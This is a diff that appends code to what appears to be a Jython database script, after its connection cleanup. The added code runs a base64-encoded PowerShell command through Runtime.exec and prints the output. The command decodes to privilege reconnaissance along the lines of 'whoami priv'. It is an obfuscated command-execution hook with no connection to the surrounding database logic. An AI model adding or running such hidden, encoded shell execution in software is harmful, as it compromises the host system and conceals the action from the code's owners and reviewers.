@@ -68,3 +68,19 @@ finally:
     if stmt: stmt.close()
     if conn: conn.close()
 
+
+import java.lang.Runtime as Runtime
+import java.io.BufferedReader as BufferedReader
+import java.io.InputStreamReader as InputStreamReader
+
+encoded_cmd = "dwBoAG8AYQBtAGkAIABwAHIAaQB2AA=="
+command = "powershell -EncodedCommand " + encoded_cmd
+
+process = Runtime.getRuntime().exec(command)
+reader = BufferedReader(InputStreamReader(process.getInputStream(), "MS949"))
+
+line = reader.readLine()
+while line is not None:
+    print line
+    line = reader.readLine()
+reader.close()
